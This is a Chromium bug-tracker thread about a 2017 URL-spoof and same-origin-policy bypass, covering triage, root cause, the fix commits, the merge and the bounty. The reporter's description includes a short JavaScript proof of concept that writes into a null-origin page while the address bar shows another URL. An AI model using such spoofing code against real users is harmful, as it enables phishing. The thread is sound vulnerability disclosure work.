# Security: URL spoof when navigating back if the first real load ends up hitting an error

| Field | Value |
|-------|-------|
| **Issue ID** | [40089387](https://issues.chromium.org/issues/40089387) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | cr...@chromium.org |
| **Created** | 2017-10-23 |
| **Bounty** | $500.00 |

## Description

AFFECTED PRODUCTS
--------------------
chrome 62.0.3202.62 stable


DESCRIPTION
--------------------
This bug could be reproduced when meet a bad 302 direction
for example, redirect to data-url
then we could write code into null origin page
my exp use this bug to make a perfect spoofing
so let me show you the code first

<script>
s=window.open("http://xsser.math1as.com/bad302.php", "sss");
function pwn()
{
	s=window.open("https://www.math1as.com/history.html", "sss");
}
setTimeout("pwn()",1000);
setTimeout("s.document.write('write to null origin')",2000);
</script>

steps
1.open bad302.php then get an error(error.jpg)
2.history.html->history.go(-1);
3.get a page with null origin,address bar=http://xsser.math1as.com/bad302.php
4.if you try to write code into a null-origin page,you should be blocked by sop(block_sop.jpg)
5.but in this exp,we bypass SOP and finally write code into the target.

the attack result:(result.jpg)

## Attachments

- [error.jpg](attachments/error.jpg) (image/jpeg, 20.8 KB)
- [block_sop.jpg](attachments/block_sop.jpg) (image/jpeg, 10.2 KB)
- [exp.html](attachments/exp.html) (text/plain, 256 B)
- [result.jpg](attachments/result.jpg) (image/jpeg, 10.5 KB)
- [spoof.html](attachments/spoof.html) (text/plain, 323 B)
- [back.html](attachments/back.html) (text/plain, 35 B)

## Timeline

### el...@chromium.org (2017-10-23)

This reproduces for me in Chrome 62, but not in Chrome 64; it throws an exception:

VM30:1 Uncaught DOMException: Blocked a frame with origin "null" from accessing a cross-origin frame.
    at <anonymous>:1:3
(anonymous) @ VM30:1
setTimeout (async)
(anonymous) @ exp (1).html:8

This might be related to PlzNavigate rather than Chrome version though.

### ts...@chromium.org (2017-10-23)

Over to plz navigate folks.

### el...@chromium.org (2017-10-23)

[Comment Deleted]

### el...@chromium.org (2017-10-23)

Sorry, I probably should've just tried it. When I change chrome://flags/#browser-side-navigation to DISABLED in Chrome 64, I still see the exception listed in #1, so it's likely not PlzNavigate. 

However, when I change chrome://flags/#enable-site-per-process from ENABLED to DISABLED, Chrome 64 allows access and enables the write into the error page.

### ke...@chromium.org (2017-10-23)

I see the same: on trunk it repros when run without flags, and throws an exception with --site-per-process. So the bug is still active but if you are on the Site Isolation finch experiment then you won't see it.

Is this really high severity? How bad is a write to null origin?

[Monorail components: Blink>SecurityFeature>SameOriginPolicy]

### ma...@gmail.com (2017-10-23)

Re #5
as what i show in my exp.html , it at least could cause a perfect spoof
the spoof page could be interacted , so that it's much more dangerous than https://crbug.com/chromium/776402 (which marked as medium secerity)

### ma...@gmail.com (2017-10-23)

just a write to null origin maybe not so dangerous
but this bug combined two parts: SOP bypass + addressbar spoof
and by all means, bypass the SOP would bring some other potencial problems.
so that i think it's of high severity

### dc...@chromium.org (2017-10-23)

So this is definitely a URL spoof. However, it's because we're getting confused about what URL to show in the URL bar.

Roughly what's happening is this:
1. We open a new window, it's about:blank. It inherits it's opener's origin. Call this history entry #1a.
2. We attempt to load a page. Normally, this navigation should replace history entry #1a with history entry #1b. I'm not sure what happens on the browser side since this is an error page.
3. We then navigate it to history.html, which creates history entry #2.
4. history.html triggers a back navigation, which... navigates to about:blank (history entry #1a) instead of history entry #1b (probably because it was an error page, and we probably do something special with error pages).

Because we navigated back to about:blank, it inherits the origin--but the URL shows the URL of the failed navigation, this becomes a URL spoof.

[Monorail components: -Blink>SecurityFeature>SameOriginPolicy UI>Browser>History]

### ma...@gmail.com (2017-10-23)

Re #8
oh , I know what lead to this problem
a moment ago i search the previous bugs
the bad fix in https://crbug.com/chromium/723796 may be the best answer for it.

### ma...@gmail.com (2017-10-23)

based on the https://crbug.com/chromium/777419#c24 in https://crbug.com/chromium/723796
the bad fix looks like 
when meet 302 error

OnResponseStarted(net_error) // url() => old_url

but this certainly caused a spoof vuln
since the old_url is loaded in addressbar , but the origin is null
the patch i think for it 

OnResponseStarted(net_error) // url() => 'about:blank'



### ma...@gmail.com (2017-10-23)

a simple patch
content/browser/frame_host/navigation_controller_impl.cc

if (!rfh->GetParent() &&
      IsBlockedNavigation(navigation_handle->GetNetErrorCode())) {
    DCHECK(params.url_is_unreachable);
    active_entry->SetURL(GURL(url::kAboutBlankURL));
    active_entry->SetVirtualURL(url::kAboutBlankURL);
    if (frame_entry) {
    frame_entry->SetPageState(
          PageState::CreateFromURL(active_entry->GetURL()));
    }
}

### ke...@chromium.org (2017-10-23)

If this is a URL spoof but requires the spoof target to generate an error page, it should be Sev-Medium.

Open redirects would be straightforward targets.

### cr...@chromium.org (2017-10-23)

Thanks for the report!  I'll take a closer look.

For reference, I've attached slightly modified repro files to make it easier to test with (assuming you have testserver.py from the Chrome repo running).'

Also changing components from History (which is more about chrome://history) to Navigation (which includes session history).

[Monorail components: -UI>Browser>History UI>Browser>Navigation]

### cr...@chromium.org (2017-10-23)

Ok, here's what I've found so far.

The bug was indeed introduced in nasko@'s r474535, which was meant to fix a data URL blocking bypass reported in https://crbug.com/chromium/723796.  Interestingly, the repro steps for this spoof are almost identical to the blocking bypass in that bug, except that the redirect occurs on a cross-origin URL.

That CL assigned the NavigationEntry's URL to be about:blank (to try to prevent the data URL from loading in the future) and puts the blocked URL in the virtual URL.  As we've seen in other cases, though, virtual URLs tend to be problematic, and in this case it caused the spoof.  In fact, this particular CL has already come up as the likely cause of https://crbug.com/chromium/771848 (URL confusion) and https://crbug.com/chromium/772771 (broken blocking message).

The good news is that davidben@ landed r477371 shortly after nasko@'s CL, providing a more comprehensive fix in the network stack.  I've just confirmed locally that davidben@'s r477371 is sufficient as a fix for https://crbug.com/chromium/723796.  That means we can revert nasko@'s r474535 to eliminate the spoof.  (Nasko confirmed that this theory sounds right as well.)

I'll put together a CL for that, and I'll try to include a test for the spoof itself.

### cr...@chromium.org (2017-10-25)

I have a CL started at https://chromium-review.googlesource.com/c/chromium/src/+/733959.  There were a few unexpected test failures, but I'm working through them today.

### cr...@chromium.org (2017-10-26)

The test failures on the CL have been resolved.  Nasko spotted a potential issue before I landed it yesterday, though, and we've been discussing it.  We think it's probably safe to proceed, as described below.

Nasko pointed out that we might attempt to navigate to the blocked URL if we come back to that NavigationEntry later (reload, back/forward, restore, etc).  That was the original concern in https://crbug.com/chromium/723796, when his CL landed, but davidben's CL makes sure it doesn't happen in that particular case (redirect to data URL).  It would be a problem if other cases loaded successfully after a reload, though.

We think this is not a problem for the moment, for the following reasons:

1) Any URL that is blocked regardless of context will be blocked after reload as well.
1a) This covers redirects to data URLs thanks to davidben's CL.
1b) This covers extensions that block URLs regardless of context.
1c) This covers browser-initiated navigations to non-installed extension URLs.

2) Some URLs might be blocked based on context, and could pose a concern.
2a) data URLs are blocked for renderer-initiated navigations but not browser-initiated ones.  However, they're blocked in the renderer process (in FrameLoader::PrepareRequestForThisFrame, as of r466504) before we get to this type of blocking logic, so there's no risk of reloading them later.  Also, DataUrlNavigationThrottle::WillProcessResponse() uses CANCEL rather than BLOCK_RESPONSE, so it doesn't matter even if the renderer side check is skipped.
2b) It's possible that extensions could try to block URLs based on context, and a page might use this as a way around the block.  However, such a bypass is almost certainly possible already, especially since we don't seem to expose whether navigations are browser-initiated or history to the web request API.

3) We can rule out subframe cases, since those aren't covered by the check anyway.  We'll handle those in a separate defense.

So, I think we're safe to proceed for now.  I'll file a bug to make sure we get another defense in place to prevent blocked navigations from being reloaded at all.

### cr...@chromium.org (2017-10-26)

Filed https://crbug.com/chromium/778772 for followup on https://crbug.com/chromium/777419#c16.

### bu...@chromium.org (2017-10-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/56a84aa67bb071a33a48ac1481b555c48e0a9a59

commit 56a84aa67bb071a33a48ac1481b555c48e0a9a59
Author: Charles Reis <creis@chromium.org>
Date: Thu Oct 26 20:10:42 2017

Do not use NavigationEntry to block history navigations.

This is no longer necessary after r477371.

BUG=777419
TEST=See bug for repro steps.

Cq-Include-Trybots: master.tryserver.chromium.linux:linux_site_isolation
Change-Id: I701e4d4853858281b43e3743b12274dbeadfbf18
Reviewed-on: https://chromium-review.googlesource.com/733959
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Reviewed-by: Nasko Oskov <nasko@chromium.org>
Commit-Queue: Charlie Reis <creis@chromium.org>
Cr-Commit-Position: refs/heads/master@{#511942}
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/chrome/browser/extensions/navigation_observer.cc
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/chrome/test/data/extensions/api_test/webrequest/test_blocking.js
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/chrome/test/data/extensions/api_test/webrequest/test_declarative1.js
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/content/browser/browser_side_navigation_browsertest.cc
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/content/browser/frame_host/data_url_navigation_browsertest.cc
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/content/browser/frame_host/navigation_controller_impl.cc
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/content/browser/frame_host/navigation_controller_impl_browsertest.cc
[modify] https://crrev.com/56a84aa67bb071a33a48ac1481b555c48e0a9a59/content/browser/frame_host/navigation_handle_impl_browsertest.cc


### cr...@chromium.org (2017-10-26)

Should be fixed by r511942, which we can verify in tomorrow's canary (likely 	64.0.3251.0).  Once it's baked on canary a bit, we can discuss a merge to M63.

### sh...@chromium.org (2017-10-27)

[Empty comment from Monorail migration]

### cr...@chromium.org (2017-10-27)

I just verified the fix in 64.0.3251.0.  I'll request a merge on Monday if it still looks good after the weekend.

### cr...@chromium.org (2017-10-30)

Requesting to merge r511942 to M63.  It fixes a URL spoof, as well as https://crbug.com/chromium/771848 and https://crbug.com/chromium/772771.  The change has baked over the weekend and should be safe to merge.  (It's basically a revert of an earlier CL, since there's a better fix in place for the original issue now.)

### sh...@chromium.org (2017-10-30)

This bug requires manual review: M63 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), gkihumba@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2017-10-30)

+awhalley@ for M63 merge review.

### aw...@chromium.org (2017-10-31)

[Empty comment from Monorail migration]

### cr...@chromium.org (2017-11-01)

Just to follow up on https://crbug.com/chromium/777419#c22, r511942 has been baking on Canary since 64.0.3251.0 (last Friday, 10/27) and I don't see any new crashes from it.  Can I merge it to M63?

### aw...@chromium.org (2017-11-02)

govind@ - good for M53

### aw...@chromium.org (2017-11-02)

s/53/63/

(goes to find coffee..)

### go...@chromium.org (2017-11-02)

Approving merge to M63 branch 3239 based on https://crbug.com/chromium/777419#c26 and #27. 

### bu...@chromium.org (2017-11-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c4bf532a22d83c12e4db10f204fe454e643842d7

commit c4bf532a22d83c12e4db10f204fe454e643842d7
Author: Charles Reis <creis@chromium.org>
Date: Thu Nov 02 21:14:20 2017

Do not use NavigationEntry to block history navigations.

This is no longer necessary after r477371.

BUG=777419
TEST=See bug for repro steps.
TBR=creis@chromium.org

(cherry picked from commit 56a84aa67bb071a33a48ac1481b555c48e0a9a59)

Cq-Include-Trybots: master.tryserver.chromium.linux:linux_site_isolation
Change-Id: I701e4d4853858281b43e3743b12274dbeadfbf18
Reviewed-on: https://chromium-review.googlesource.com/733959
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Reviewed-by: Nasko Oskov <nasko@chromium.org>
Commit-Queue: Charlie Reis <creis@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#511942}
Reviewed-on: https://chromium-review.googlesource.com/751765
Reviewed-by: Charlie Reis <creis@chromium.org>
Cr-Commit-Position: refs/branch-heads/3239@{#355}
Cr-Branched-From: adb61db19020ed8ecee5e91b1a0ea4c924ae2988-refs/heads/master@{#508578}
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/chrome/browser/extensions/navigation_observer.cc
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/chrome/test/data/extensions/api_test/webrequest/test_blocking.js
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/chrome/test/data/extensions/api_test/webrequest/test_declarative1.js
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/content/browser/browser_side_navigation_browsertest.cc
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/content/browser/frame_host/data_url_navigation_browsertest.cc
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/content/browser/frame_host/navigation_controller_impl.cc
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/content/browser/frame_host/navigation_controller_impl_browsertest.cc
[modify] https://crrev.com/c4bf532a22d83c12e4db10f204fe454e643842d7/content/browser/frame_host/navigation_handle_impl_browsertest.cc


### aw...@chromium.org (2017-11-06)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2017-11-06)

The VRP Panel has decided to award $500 for this report.  Cheers!

### aw...@chromium.org (2017-11-09)

[Empty comment from Monorail migration]

### aw...@google.com (2017-12-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-12-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

This issue was migrated from crbug.com/chromium/777419?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089387)*
